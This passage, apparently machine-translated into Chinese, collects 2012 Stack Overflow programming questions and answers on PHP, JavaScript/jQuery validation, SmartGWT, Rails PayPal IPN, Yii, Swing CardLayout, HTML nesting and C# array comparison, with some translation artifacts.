$img = array_pop(explode("/", $currentFile));
$fileName = basename($img, ".php").PHP_EOL;
echo $fileName; 
```

该脚本查找当前的 $.php 名​​称并将其吐出。它还削减了文件的位置和扩展名......只留下文件名。

我将如何编写这 4 行代码才不会抛出严格标准错误

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T08:16:50.270

只需添加一个变量。

```
$currentFile = $_SERVER["SCRIPT_NAME"];
$ret = explode("/", $currentFile);
$img = array_pop($ret);
$fileName = basename($img, ".php").PHP_EOL;
echo $fileName; 
```

但你只能使用`basename`，下面的代码会给你同样的结果：

```
$fileName = basename($_SERVER["SCRIPT_NAME"], ".php").PHP_EOL; 
```

# javascript - Chrome：意外的标识符，Firefox：元素列表后缺少]

> ID：12659754
> 
> 赞同：0
> 
> 时间：2012-09-30T08:13:59.143
> 
> 标签：javascript, google-maps-api-3, syntax-error, flot

以下是触发语法错误（`unexpected identifier`在 Chrome 和`missing ] after element list`Firefox 中）：

```
infowindow.setContent('<h3>'+locale+' ('+hour+':00): $'+s.total+'</h3><img src="'+fname+'" onclick="open_dialog('+flot_data+');" style="cursor:pointer;" />'); 
```

具体来说，`'+flot_data+'`在`onclick="open_dialog('+flot_data+');"`. 删除该位会删除语法错误。

Firebug 指向`flot_data`它所代表的（字面意思） `[object Object]`（它指向`O`第二个`Object`中的 .json 是由 PHP 生成的`json_encode`，所以我不认为 json 格式错误（我在这个应用程序的其他地方也能够成功操作所有我在这里尝试使用的这个对象的部分）。

我尝试离开 onclick 并注释掉我的`open_dialog`函数的内容，以确保不会在其中触发语法错误。而且，我尝试将`open_dialog()`函数的内容直接复制到 onclick 中，如下所示：
`onclick="$.plot($(\'#graph\'),'+flot_data+');"` （onclick 包含在`''`并使用`""`，所以我不得不使用转义的单引号）

我复制/粘贴了传递给它的数据`setContent`并在小提琴中对其进行了验证。为什么这里的语法不正确，但在验证中却不正确？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T13:15:11.427

问题是 float_data*不是*JSON 字符串；它显然已经被解析为一个 JavaScript 对象，可能是通过检索它的 AJAX 调用。您不能将对象与字符串连接并期望看到 JSON；该语言不知道其原始格式是什么，也无法将其转换回来。

您需要使用原始 JSON 字符串，然后在 open_dialog 中对其进行解析，或者更好的办法是完全避免使用内联处理程序，并使用 jQuery 的`.click(function)`.

# javascript - Javascript/Jquery 在按键/keydown 上验证十进制输入

> ID：12659756
> 
> 赞同：2
> 
> 时间：2012-09-30T08:14:34.070
> 
> 标签：javascript, jquery, regex, validation, keydown

我正在尝试找到一种方法来验证按键上的文本输入，我只想在我的文本输入中允许数字，包括小数。

我正在采用使用 jQuery.keydown 的方法，并检查密钥是什么，如果密钥不在允许列表中，则使用 event.preventDefault()。但从那以后，我读到密钥在整个浏览器中并不一致，而且我也担心不同的操作系统。

我遇到过这个问题，但我不精通正则表达式，不确定这是否适合我的需求： [jquery - validate characters on keypress？](https://stackoverflow.com/questions/2812585/jquery-validate-characters-on-keypress)

使用这种方法，当键入 00\. 时，期望 00.00 的正则表达式会阻止用户，因为在键入时会检查正则表达式。

谢谢

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-30T08:25:05.910

如果您想限制输入（而不是验证），您可以使用关键事件。像这样的东西：

```
<input type="text" class="numbersOnly" value="" /> 
```

和：

```
jQuery('.numbersOnly').keyup(function () { 
    this.value = this.value.replace(/[^0-9\.]/g,'');
}); 
```

**或者**，我们可以在用户“离开”字段后更新它，使用 on change 事件，这样用户仍然可以使用箭头键浏览文本。

```
jQuery('.numbersOnly').on('change', function () { 
    this.value = this.value.replace(/[^0-9\.]/g,'');
}); 
```

这会立即让用户知道他们不能输入字母字符等，而不是稍后在验证阶段。

您仍然需要验证，因为输入可能通过使用鼠标剪切和粘贴来填充，或者可能通过可能不会触发关键事件的表单自动完成器来填充。

小提琴：http: [//jsfiddle.net/shannonhochkins/eu7P9/](http://jsfiddle.net/shannonhochkins/eu7P9/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-30T08:25:16.290

您不应该依赖关键事件，因为这意味着如果用户*右键单击 -> 粘贴*无效字符，验证将失败。

相反，您应该使用 zurb`textchanged`事件之类的东西 - 无论输入模式如何（键、粘贴、拖放等），它都会准确触发

[http://www.zurb.com/playground/jquery-text-change-custom-event](http://www.zurb.com/playground/jquery-text-change-custom-event)

在您的`textchanged`处理程序中，您可以输入适当的正则表达式来处理小数。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-11T11:02:29.743

我用 e.which 来验证十进制数

```
$(document).ready(function () { 
    var isEnable=true;
$(".only-number-period").live('keydown', function (e) {
    //isEnable = (e.which != 110) ? false : true;
        if( ((e.which == 9) || (e.which == 46) || (e.which == 8) || (e.which == 110) || (e.which >= 48 && e.which <= 57) || (e.which >= 96 && e.which <= 105))){
            if(isEnable ==false && e.which ==110){return false;}
        }else{
        return false
        }  
    if (isEnable == true) {            
    isEnable=(e.which ==110)?false:true;
        }
    });
});​ 
```

链接::http://jsfiddle.net/rTr2w/

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-09-30T08:31:42.643

使用[Shannon](https://stackoverflow.com/users/1683943/shannon-hochkins)的回答，我提供了以下简单的 JS 代码：

```
jQuery('.numbersOnly').keyup(function () {
    if(($(this).val().split(".")[0]).indexOf("00")>-1){
        $(this).val($(this).val().replace("00","0"));
    } else {
        $(this).val($(this).val().replace(/[^0-9\.]/g,''));
    }
}); 
```

看看这个：http: [//jsfiddle.net/SnakeEyes/eu7P9/2/](http://jsfiddle.net/SnakeEyes/eu7P9/2/)

**更新** 为避免多个`.`符号，请使用以下代码：

```
jQuery('.numbersOnly').keyup(function (e) {
    if(($(this).val().split(".")[0]).indexOf("00")>-1){
        $(this).val($(this).val().replace("00","0"));
    } else {
        $(this).val($(this).val().replace(/[^0-9\.]/g,''));
    }

    if($(this).val().split(".")[2] != null || ($(this).val().split(".")[2]).length ){
        $(this).val($(this).val().substring(0, $(this).val().lastIndexOf(".")));
    }   
}); 
```

示例：http: [//jsfiddle.net/SnakeEyes/eu7P9/3/](http://jsfiddle.net/SnakeEyes/eu7P9/3/)

# java - 与 SelectItem (smartGWT) 一起使用的重复数据源字段

> ID：12659758
> 
> 赞同：0
> 
> 时间：2012-09-30T08:15:12.930
> 
> 标签：java, gwt, datasource, smartgwt

我正在尝试在 SelectItem 组件中列出一个表。我为此目的使用 ListGrid 组件。这是代码：

```
 final ListGrid brandGrid = new ListGrid();

    ListGridField nameField = new ListGridField("name");
    ListGridField descriptionField = new ListGridField("description");
    ListGridField detailField = new ListGridField("detail");

    final SelectItem filterList = new SelectItem();
    filterList.setDisplayField("name");
    filterList.setValueField("description");
    filterList.setPickListWidth(400);

    filterList.setOptionDataSource(myDataSource);
    filterList.setPickListFields(nameField, descriptionField);
    filterList.setPickListProperties(brandGrid);
    filterList.setDefaultValue(record.getAttributeAsString("name"));
    filterList.setShowTitle(false);
    filterList.setStartRow(false); 
```

以及 myDataSource 实例的 DataSource 代码（我`DataSource myDataSource`在使用之前调用此方法来初始化类属性`SelectItem filterList`）：

```
private DataSource getBrandData(List<BrandDB> result){
        DataSource ds = new DataSource();

        DataSourceTextField id = new DataSourceTextField();
        id.setName("idBrand");
        id.setPrimaryKey(true);

        DataSourceTextField name = new DataSourceTextField();
        name.setName("name");

        DataSourceTextField description = new DataSourceTextField();
        description.setName("description");

        ds.setFields(id, nazov, popis);

        ds.setClientOnly(true);
        for(int i = 0; i < result.size(); i++){
            Record rc = new Record();
            rc.setAttribute("idBrand", result.get(i).getIdBrand()+"");
            rc.setAttribute("name", result.get(i).getName());
            rc.setAttribute("description", result.get(i).getDescription());
            ds.addData(rc);
        }
        return ds;
    } 
```

问题是`description`我的数据源中的值在多个地方具有相同的值（这些值的 id 和名称不同）。我得到以下错误：

```
TMR0:WARN:fetchMissingValues:isc_SelectItem_1:Deriving valueMap for 'description' from dataSource based on displayField 'name'. This dataSource contains more than one record with description set to Not defined with differing name values. Derived valueMap is therefore unpredictable. 
```

任何想法如何设置 SelectItem 以接受这些重复值？非常感谢您的回答。:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T09:26:19.230

问题解决了：

错误位于这行代码中：

```
filterList.setValueField("description"); 
```

描述不是唯一的，因此它不能是 SelectItem 组件内的值字段。只需编辑这行代码，如下所示：

```
filterList.setValueField("idBrand"); 
```

`idBrand`是唯一的，因为它被定义为 DataSource 中的主键，因此 SelectItem 已唯一标识其值字段并可以进行过滤。

# ruby-on-rails - Rails - 使用 paypal-recurring gem 处理 PayPal IPN 回调

> ID：12659759
> 
> 赞同：7
> 
> 时间：2012-09-30T08:15:20.777
> 
> 标签：ruby-on-rails, ruby-on-rails-3, paypal, paypal-ipn

我正在使用[paypal-recurring gem](https://github.com/fnando/paypal-recurring)来处理 Rails 应用程序中的定期付款。我的大部分代码来自这个优秀的[Railscast](http://railscasts.com/episodes/289-paypal-recurring-billing)，但我还想添加一个 payment_notification 模型来接受 IPN 回调并存储任何相关数据。这个[Railscast](http://railscasts.com/episodes/142-paypal-notifications)介绍了如何设置通知。但是，我很难弄清楚如何将 paypal-recurring gem IPN 回调发送到我的 PaymentNotification 模型。

如何设置 :ipn_url 以正确地将 IPN 回调写入我的 PaymentNotification 模型。到目前为止，我尝试了以下方法：

1）添加`ipn_url: "http://my-app-name.com/payment_notifications"`到流程方法（选项下）或payment_notifications_url

[2) 尝试此GitHub 问题页面](https://github.com/fnando/paypal-recurring/issues/10)底部建议的解决方案

3) 使用 Paypal 的即时支付通知 (IPN) 模拟器发送到“http://my-app-name.com/payment_notifications”，但出现错误：*IPN 交付失败。HTTP 错误代码 401：未经授权*

**编辑**

**我已经能够成功模拟将 IPN 传送到我的 payment_notifications_url。现在我只需要弄清楚如何指向重复出现的 gem 将 ipn 发送到那里。**

任何指针将不胜感激。以下是我当前的一些代码。如果我忘记了任何相关部分，请告诉我。

**贝宝支付模式**

```
 class PaypalPayment
   def initialize(subscription)
     @subscription = subscription
   end

   def checkout_details
     process :checkout_details
   end

   def checkout_url(options)
     process(:checkout, options).checkout_url
   end

   def make_recurring
     process :request_payment
     process :create_recurring_profile, period: :monthly, frequency: 1, start_at: Time.zone.now
   end

   def cancel_recurring
     process :cancel
   end

 private

   def process(action, options = {})
     options = options.reverse_merge(
       token: @subscription.paypal_payment_token,
       payer_id: @subscription.paypal_customer_token,
       description: @subscription.plan.name,
       amount: @subscription.plan.monthly_price,
       currency: "JPY"
     )
     response = PayPal::Recurring.new(options).send(action)
     raise response.errors.inspect if response.errors.present?
     response
   end
 end 
```

**PaymentNotifications 控制器**

```
 class PaymentNotificationsController < ApplicationController
   protect_from_forgery :except => [:create]

   def create
     PaymentNotification.create!(:params => params, :status => params[:payment_status], :transaction_id => params[:txn_id])
     render :nothing => true
   end
 end 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-01T05:59:51.867

我让它工作了。万一将来有人在使用 PayPal IPN 时遇到问题，以下是我做错的一些事情：

1）在我的订阅控制器中，我调用的是 save_with_payment 方法，而不是调用它`if @subscription.save`。`if @subscription.save_with_payment`

2）在我添加的过程方法中`ipn_url: "https://my-app-name.com/payment_notifications",`

```
 def process(action, options = {})
     options = options.reverse_merge(
       token: @subscription.paypal_payment_token,
       payer_id: @subscription.paypal_customer_token,
       description: @subscription.plan.name,
       amount: @subscription.plan.monthly_price,
       ipn_url: "https://my-app-name.com/payment_notifications",
       currency: "JPY"
    )
     response = PayPal::Recurring.new(options).send(action)
     raise response.errors.inspect if response.errors.present?
     response
   end 
```

3) 在 PayPal 的开发人员沙箱中，单击“测试帐户”，然后单击“进入沙箱测试站点”橙色按钮。在那里，使用您的沙盒卖家凭据登录。进入“我的帐户”和“个人资料”后，在“销售偏好”下点击“即时付款通知偏好”。将通知 url 设置为与您设置的接收 IPN POST 的 url 匹配，并将消息传递设置为启用。

# php - 接收 Ajax 并在照片中显示输出？

> ID：12659760
> 
> 赞同：1
> 
> 时间：2012-09-30T08:15:25.067
> 
> 标签：php, jquery, ajax, image

如何接收 Ajax 并在照片中显示输出？图片应该显示在div标签里面每一个拜耳文字之后，改变文字就可以改变照片内容显示的照片是写在表格里的

这段代码

> ```
> <script>
> function AjaxRequest() {
>     var xmlhttp = null;
>     if (window.XMLHttpRequest) {
>         // code for IE7+, Firefox, Chrome, Opera, Safari
>           xmlhttp = new XMLHttpRequest();
>     } // else // code for IE6, IE5
>     return xmlhttp;
> }
> 
> function ajaxAction() {
>     var font_category = document.getElementById("ajaxField").value;
> var xmlHttp = AjaxRequest();
>     xmlHttp.open("POST" , "ajax.php?message=" + message , true);
>     xmlHttp.onreadystatechange = function() {
>         if(xmlHttp.readyState == 1)
>             response.innerHTML = "Loading...";
>         if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
>             response.innerHTML = xmlHttp.responseText;
>     }
>     xmlHttp.send(null);
> }
> </script>
> 
> <textarea id="ajaxField12" name="message" rows="2" cols="20" value="Send" onchange="javascript:ajaxAction();">
> 
> </textarea> 
> 
> <div id="ajaxResponse" height="42" width="42"> 
> </div> 
> ```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T08:42:35.160

如果你想展示照片而不是使用这样的东西

```
$("document").ready(function(){
$("textarea").on("keyup",function(){ 
      $values=$(this).val();
      $.get("ajax.php?message="+values,function(data){
     $("#ajaxResponse").html("<img src="+data+" height='10' width='10'>");

})

})

}) 
```

在你的服务器端

```
 <?php
    $statement = $pdo->prepare("SELECT img.src from img WHERE message=?");
    $statement->execute(array($_GET["message"]));
    if($row_count = $statement->rowCount()>0);
       { $row = $statement->fetch(PDO::FETCH_ASSOC);
       echo $row["src"];
       }
    ?> 
```

你不应该使用`mysql_*`你应该了解准备好的语句的函数，而应该使用 PDO 或 MySQLi。如果您无法决定，请查看评论或转到[PDO](http://php.net/pdo)

# yii - CJuiAutocomplete Widget 中的 $_GET('term']

> ID：12659761
> 
> 赞同：1
> 
> 时间：2012-09-30T08:15:47.430
> 
> 标签：yii

$_GET['term'] 中的这个“术语”来自哪里。. .

该“术语”的含义或内容是什么？

这是一个示例代码：

```
public function actionSuggest() {
    $criteria = new CDbCriteria;
    $criteria->select = array('lastName', 'firstName', 'middleName','idNo','yrLevel','gender');
    $criteria->addSearchCondition('lastName', $_GET['term']);
    $criteria->limit = 10;
    $data = Engineering::model()->findAll($criteria);
    $arr = array();
    foreach ($data as $item) {
        $arr[] = array(
            'label' => $item->lastName.' '.$item->firstName.' '.$item->middleName[0].'.',
            'value' => $item->lastName,
            'lastname' => $item->lastName,
            'firstname' => $item->firstName,
            'middlename' => $item->middleName,
            'idno' => $item->idNo,
            'gender' => $item->gender,
            'yrlevel' => $item->yrLevel,    
        );
    }
    echo CJSON::encode($arr);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T09:16:11.260

CJuiAutocomplete 小部件依赖于[jQuery Autocomplete](http://jqueryui.com/demos/autocomplete/)插件，它会在您输入 ajax GET 请求时发送文本字段的内容。文本字段的内容在 GET-parameter 中发送`term`。服务器端代码应该按这个词搜索并返回找到的记录（你的代码已经这样做了）。

# javascript - 图像而不是复选框工作缓慢

> ID：12659762
> 
> 赞同：0
> 
> 时间：2012-09-30T08:15:53.080
> 
> 标签：javascript, html, performance, checkbox, image

我用图像切换了我的复选框，但是现在当我点击其中一个复选框时，它需要 2 秒才能显示选中的 img。

这只发生在我第一次点击复选框时，第二次等等。它工作得很好。

可能在您将 img 加载到网站内存后点击复选框，然后它就可以顺利运行。

有解决方案吗？也许当页面加载时，它可以为它的内存加载任何可选的 img 或类似的东西。

提前致谢。

这是我的[网站](http://doarna.com/%D7%93%D7%95%D7%90%D7%A8-%D7%A0%D7%A2/)，它是希伯来语的，但内容并不重要。

我使用重力形式，但在这种情况下它并不重要。代码示例如下，感谢每个人。

```
.DesignCheckBox label {
                   background-repeat: no-repeat;
                   border: 2px solid #DDD;
                           height: 150px!important;
                           font-size: 150%;
                           -moz-border-radius: 20px;
                           -webkit-border-radius: 20px;
                border-radius: 20px; 
                -khtml-border-radius: 20px; 
                                                  }
.DesignCheckBox label:hover {
                   border: 2px solid #000095;
                           background-color:  #F0F7F7;
                           cursor: hand; cursor: pointer;
                                                  }

.HideCheckBox input[type="checkbox"]{display:none!important;}

         li.gchoice_4_1 label {
                       background-image: url(http://doarna.com/wp-content/uploads/2012/09/XCellcom.gif);
                               }

         li.gchoice_4_1 input[type="checkbox"]:checked + label { 
                       background-image: url(http://doarna.com/wp-content/uploads/2012/09/VCellcom.gif);
                       }

         li.gchoice_4_2 label {
                       background-image: url(http://doarna.com/wp-content/uploads/2012/09/XOrange.gif);
                               }

         li.gchoice_4_2 input[type="checkbox"]:checked + label { 
                       background-image: url(http://doarna.com/wp-content/uploads/2012/09/VOrange.gif); 
                       } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T09:26:47.120

你走对了，实际上浏览器只加载页面需要在页面加载时提供的那些图像。其他事件仅在下载所需的图像时触发，一旦下载，它将存储在您的浏览器缓存中。这意味着下次您将获得更快的响应，因为图像现在在您的本地计算机上。

我在这里建议的是使用 display 等于 none 来隐藏图像。在页面加载集设置为检查图像不显示，单击设置显示以阻止检查图像。

如果你想要这些片段，请提供一些代码。

# java - 如何签约卡片布局

> ID：12659763
> 
> 赞同：1
> 
> 时间：2012-09-30T08:16:04.343
> 
> 标签：java, swing, jframe, jpanel, cardlayout

我有一个带有 VerticalLayout的**mainPanel**`(org.jdesktop.swingx.VerticalLayout)`。主面板有几个子面板。其中之一是根据用户选择动态变化的面板。所以，我已经设置了它的布局`CardLayout`，我认为这是实现这一目标的最简单（也许是最好的？）方式。

我将调用该面板**elasticPanel**。顾名思义，它应该是有弹性的。这意味着，它应该能够扩展和收缩。假设它的行为是这样的。如果用户选择`1`，则**elasticPanel**应该显示一个，例如`JComboBox`。如果用户选择`2`然后，两个`JComboBox`...

好的，到目前为止它工作得很好。现在，当显示两个s时，用户`1`再次选择。我现在需要做的是应该显示一个正常大小的。但由于已经扩展，发生的情况是它显示拉伸以适应它的大小。所以它给人一种奇怪的感觉。`elasticPanel``JComboBox``elasticPanel``JComboBox``elasticPanel``JComboBox`

* * *

以下屏幕截图显示了我的界面遇到的问题。

在选择之前。`NONE`被选中。

![在此处输入图像描述](../Images/38566f092330f77c71301f5be24ae0da.png)

选择了一个元素

![在此处输入图像描述](../Images/520d22ecf78ef277ae82a2e0acca8b58.png)

`NONE`再次被选中

![在此处输入图像描述](../Images/5044593ea491560840d7fdeb85d5e6a5.png)

我需要最后一个屏幕截图中的`elasticPanel`（*故障位置*）与第一个屏幕截图中的一样。这只是一个简单的案例。想象一下`NONE`显示大约 5、6 个子组件后返回时的样子。

我试过`setSize()`方法。它没有做任何事情..那么如何解决这个问题？

任何帮助表示赞赏。谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-30T14:43:58.127

很难说你指`CardLayout`的是什么东西。由于[CardLayout](http://docs.oracle.com/javase/tutorial/uiswing/layout/card.html)以不同的方式工作。您可以做的就是简单地放置一个`JPanel`说**basePanel 并将**`GridLayout(0, 1)`其放在`JPanel`另一个`JPanel`说**contentPanel**`JFrame`的顶部，然后在您从视图中添加或删除元素时将其设置为并调用 pack() 的内容窗格。这是一个向您展示我的意思的示例。

```
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;

public class ElasticPanel
{
    private JFrame frame;
    private JPanel contentPane;
    private JPanel basePanel;
    /*
     * Array to hold the JComboBox
     * elements.
     */
    private JComboBox[] prodCombo;  
    private JComboBox[] temp;
    /* 
     * Counter to keep track
     * of the number of JComboBox 
     * present.
     */
    private int counter;  
    /*
     * Data for each JComboBox
     */
    private String[] data = {
                                "None",
                                "Sub Category"
                            };

    private ActionListener comboAction =
            new ActionListener()
    {
        @Override
        public void actionPerformed(ActionEvent ae)
        {
            JComboBox cbox = (JComboBox) ae.getSource();
            String command = (String) ae.getActionCommand();
            int index = Integer.parseInt(command);
            String selection = (String) cbox.getSelectedItem();

            if (selection.equals("None"))
            {
                /*
                 * i = index + 1, because, we want to
                 * remove all JComboBox after this one.
                 */
                for (int i = (index + 1); i < prodCombo.length; i++)
                {
                    temp = new JComboBox[prodCombo.length];
                    for (int j = 0; j < prodCombo.length; j++)
                        temp[j] = prodCombo[j];
                    basePanel.remove(prodCombo[i]); 
                }
                prodCombo = new JComboBox[index + 1];
                for (int i = 0; i <= index; i++)
                {                   
                    prodCombo[i] = temp[i];
                }
                counter = prodCombo.length;
                System.out.println("Item Removed\nCounter : " + counter);
            }
            else if (selection.equals("Sub Category"))
            {
                counter++;
                temp = new JComboBox[counter];
                for (int i = 0; i < prodCombo.length; i++)
                {
                    temp[i] = prodCombo[i];
                }
                temp[counter - 1] = new JComboBox(data);
                temp[counter - 1].setActionCommand("" + (counter - 1));
                temp[counter - 1].addActionListener(this);
                prodCombo = new JComboBox[counter];
                for (int i = 0; i < counter; i++)
                    prodCombo[i] = temp[i];
                basePanel.add(prodCombo[counter - 1]);  
                System.out.println("Item Added\nCounter : " + counter);
            }

            //basePanel.revalidate();
            //basePanel.repaint();
            frame.pack();
        }
    };

    public ElasticPanel()
    {
        prodCombo = new JComboBox[1];
        counter = 1;
    }

    private void displayGUI()
    {
        frame = new JFrame("Elastic Panel Example");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        contentPane = new JPanel();

        basePanel = new JPanel(new GridLayout(0, 1, 5, 5));

        prodCombo[counter - 1] = new JComboBox(data);
        prodCombo[counter - 1].setActionCommand("" + (counter - 1));
        prodCombo[counter - 1].addActionListener(comboAction);

        basePanel.add(prodCombo[counter - 1]);
        contentPane.add(basePanel);

        frame.setContentPane(contentPane);
        frame.pack();
        frame.setLocationByPlatform(true);
        frame.setVisible(true);
    }

    public static void main(String... args)
    {
        SwingUtilities.invokeLater(new Runnable()
        {
            @Override
            public void run()
            {
                new ElasticPanel().displayGUI();
            }
        });
    }
} 
```

**最新更新：**

通过添加更多组件并将弹性面板放置在其他位置而不是内容窗格顶部来获得更多洞察力。

```
import java.awt.*;
import java.awt.event.*;
import java.net.MalformedURLException;
import java.net.URL;
import javax.swing.*;

public class VirtualViewGUI extends JFrame
{
    private JPanel rightPanel;
    private ElasticPanel elasticPanel;

    public VirtualViewGUI()
    {
        super("Virtual View");

        JMenuBar jmenuBar = new JMenuBar();
        JMenu fileMenu = new JMenu("File");
        JMenu helpMenu = new JMenu("Help");
        JMenu feel = new JMenu("Look & Feel");

        JMenu layOutMenu = new JMenu("ConfigureCells");
        JMenuItem add_files = new JMenuItem("Select Directory.."); 
        JMenuItem minCellSize = new JMenuItem("height 260 X  width 260"); 
        JMenuItem moderateCellSize = new JMenuItem("height 320 X  width 320"); 
        JMenuItem maxCellSize = new JMenuItem("height 360 X  width 360"); 
        JMenuItem exit = new JMenuItem("Exit");
        JMenuItem help = new JMenuItem("Help Content");

        fileMenu.add(add_files);
        fileMenu.add(exit);
        layOutMenu.add(minCellSize);
        layOutMenu.add(moderateCellSize);
        layOutMenu.add(maxCellSize);
        helpMenu.add(help);

        jmenuBar.add(fileMenu);
        jmenuBar.add(layOutMenu);
        jmenuBar.add(helpMenu);

        ImageIcon myImage = null;
        try
        {
            myImage = new ImageIcon(
                new URL("http://gagandeepbali.uk.to/" + 
                        "gaganisonline/images/swing/" + 
                        "stackoverflow/cow-cartoon.jpg"));
        }
        catch(MalformedURLException mue)    
        {
            mue.printStackTrace();
        }

        JLabel icon = new JLabel(myImage);
        icon.setIcon(myImage);
        setJMenuBar(jmenuBar); 

        rightPanel = new JPanel();
        elasticPanel = new ElasticPanel(this);
        rightPanel.add(elasticPanel);

        JPanel contentPane = new JPanel();
        contentPane.setLayout(new BorderLayout(5, 5));
        contentPane.add(icon, BorderLayout.CENTER);
        contentPane.add(rightPanel, BorderLayout.LINE_END);

        setContentPane(contentPane);
        pack();
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLocationByPlatform(true);    
        setVisible(true);
        System.out.println("File Separator is : " + System.getProperty("file.separator"));
    }

    public static void main(String... args)
    {
        SwingUtilities.invokeLater(new Runnable()
        {
            @Override
            public void run()
            {
                new VirtualViewGUI();
            }
        });
    }
}

class ElasticPanel extends JPanel
{
    private JFrame frame;
    private JPanel contentPane;
    /*
     * Array to hold the JComboBox
     * elements.
     */
    private JComboBox[] prodCombo;  
    private JComboBox[] temp;
    /* 
     * Counter to keep track
     * of the number of JComboBox 
     * present.
     */
    private int counter;  
    /*
     * Data for each JComboBox
     */
    private String[] data = {
                                "None",
                                "Sub Category"
                            };

    private ActionListener comboAction =
            new ActionListener()
    {
        @Override
        public void actionPerformed(ActionEvent ae)
        {
            JComboBox cbox = (JComboBox) ae.getSource();
            String command = (String) ae.getActionCommand();
            int index = Integer.parseInt(command);
            String selection = (String) cbox.getSelectedItem();

            if (selection.equals("None"))
            {
                /*
                 * i = index + 1, because, we want to
                 * remove all JComboBox after this one.
                 */
                for (int i = (index + 1); i < prodCombo.length; i++)
                {
                    temp = new JComboBox[prodCombo.length];
                    for (int j = 0; j < prodCombo.length; j++)
                        temp[j] = prodCombo[j];
                    remove(prodCombo[i]);   
                }
                prodCombo = new JComboBox[index + 1];
                for (int i = 0; i <= index; i++)
                {                   
                    prodCombo[i] = temp[i];
                }
                counter = prodCombo.length;
                System.out.println("Item Removed\nCounter : " + counter);
            }
            else if (selection.equals("Sub Category"))
            {
                counter++;
                temp = new JComboBox[counter];
                for (int i = 0; i < prodCombo.length; i++)
                {
                    temp[i] = prodCombo[i];
                }
                temp[counter - 1] = new JComboBox(data);
                temp[counter - 1].setActionCommand("" + (counter - 1));
                temp[counter - 1].addActionListener(this);
                prodCombo = new JComboBox[counter];
                for (int i = 0; i < counter; i++)
                    prodCombo[i] = temp[i];
                add(prodCombo[counter - 1]);    
                System.out.println("Item Added\nCounter : " + counter);
            }

            //revalidate();
            //repaint();
            frame.pack();
        }
    };

    public ElasticPanel(JFrame frame)
    {
        this.frame = frame;
        prodCombo = new JComboBox[1];
        counter = 1;

        setLayout(new GridLayout(0, 1, 5, 5));

        prodCombo[counter - 1] = new JComboBox(data);
        prodCombo[counter - 1].setActionCommand("" + (counter - 1));
        prodCombo[counter - 1].addActionListener(comboAction);

        add(prodCombo[counter - 1]);        
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-30T09:07:37.643

如果我理解正确，您有 2 个不同的面板，您可以使用`CardLayout`. 的问题`CardLayout`是它占用了最大面板的大小。

因此，`CardLayout`您将无法缩小容器的大小，但您可以避免组合框被拉伸，方法是使用 a 将面板包裹在另一个面板中`BorderLayout`，并将面板放入`BorderLayout.NORTH`

# html - 将 h3 嵌套在锚内 - 这如何有效？

> ID：12659766
> 
> 赞同：7
> 
> 时间：2012-09-30T08:16:29.380
> 
> 标签：html, w3c, w3c-validation

```
<li class="vcard">
  <a class="url" href="/about/us/">
    <img class="photo" alt="some" src="/img/nicething.png">
    <h3>hello</h3>
  </a>
  <p class="role meta">Something here</p>
</li> 
```

我已经看过这段代码，我已经验证过了，它在 w3c HTML5 验证中返回 VALID。

我很难说我们不能`h3`在`anchor`.

`display:block;`如果我们是主播，这似乎变得有效？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-09-30T08:20:45.103

如果您查看[HTML5 规范](http://dev.w3.org/html5/spec/single-page.html#the-a-element)`<a>`，标签上有一个部分：

> 该`a`元素可以围绕整个段落、列表、表格等，甚至整个部分，只要其中没有交互式内容（例如按钮或其他链接）。

[我在HTML4 规范](http://www.w3.org/TR/html401/struct/links.html#h-12.2.2)中找不到任何内容说将块级标签放在内联级标签内是无效的，但我确实记得在某处读过它。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-09-30T12:50:30.597

它在 HTML5 中被声明为有效，因为它对[元素的](http://www.w3.org/TR/html5/the-a-element.html#the-a-element)[定义`a`](http://www.w3.org/TR/html5/the-a-element.html#the-a-element)具有“透明”内容模型。因此，当一个`a`元素出现在允许的上下文中时`h3`，则`a`允许该元素包含一个`h3`元素。

这偏离了 HTML 4.01 规范，其中允许[`a`元素仅具有“内联”内容（例如，没有标题）。](http://www.w3.org/TR/html401/struct/links.html#edef-A)所有以前的 HTML 规范都采取相同的立场。

However, browsers actually let you nest `h3` inside `a`, too, so HTML5 is effectively just echoing browser practice. Note, however, that there is a functional difference: you can see this by clicking on some point to the right of the heading text. (The reason is that if you nest `h3` inside `a`, the link takes the full available width, extending past the text.)

Any CSS settings are immaterial here. HTML validity does not depend on them, or even on the existence of CSS.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-30T10:50:16.563

> ### 你好
> 
> 这里有东西

你必须添加 display:block 到 vcard 类

**之后，您将拥有一个有效的 w3 文档，因为在 W3 标准中，您不能在内联元素（a）中包含块元素（h3），因此您必须将作为块元素容器的标签转换为块元素插入内联元素**

# c# - 比较数组内容，SequenceEqual 和 StructuralComparisons.StructuralEqualityComparer 的区别

> ID：12659769
> 
> 赞同：7
> 
> 时间：2012-09-30T08:16:43.327
> 
> 标签：c#, .net, .net-4.0

我有 2 个数组：

```
 int[] arr1 = new int[] { 1, 2, 3 };
        int[] arr2 = new int[] { 1, 2, 3 }; 
```

我需要检查它们是否相等（不是参考）

write 和有什么不一样：

```
 Console.WriteLine(arr1.SequenceEqual(arr2)); //true 
```

对比

```
 IStructuralEquatable eqArray1 = arr1;
        Console.WriteLine(eqArray1.Equals(arr2, StructuralComparisons.StructuralEqualityComparer));  //true 
```

两者都返回 True ..

我应该什么时候使用每个？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T14:05:25.283

